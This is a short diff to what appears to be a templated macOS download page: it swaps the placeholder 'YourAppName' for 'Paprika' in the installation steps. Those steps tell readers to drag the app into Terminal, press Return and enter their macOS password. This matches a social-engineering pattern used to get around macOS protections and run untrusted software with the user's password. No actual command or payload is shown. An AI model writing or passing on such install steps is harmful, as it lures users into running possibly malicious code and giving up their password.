@@ -24,12 +24,12 @@
 ---
 If the download button doesn’t work, follow the Terminal installation method below.
 ---
-# 📦 How to Install YourAppName For Mac
+# 📦 How to Install Paprika For Mac
 
 ## Installation via .dmg
 
 1. Click the **Download for macOS** button above to get the `.dmg`.
-2. Open the `.dmg` installer and drag **YourAppName** to your **Applications** folder.
+2. Open the `.dmg` installer and drag **Paprika** to your **Applications** folder.
 3. Open **Terminal**, drag the app into the Terminal window to paste its path.
 4. Press **Return**, then enter your macOS password if prompted.
 
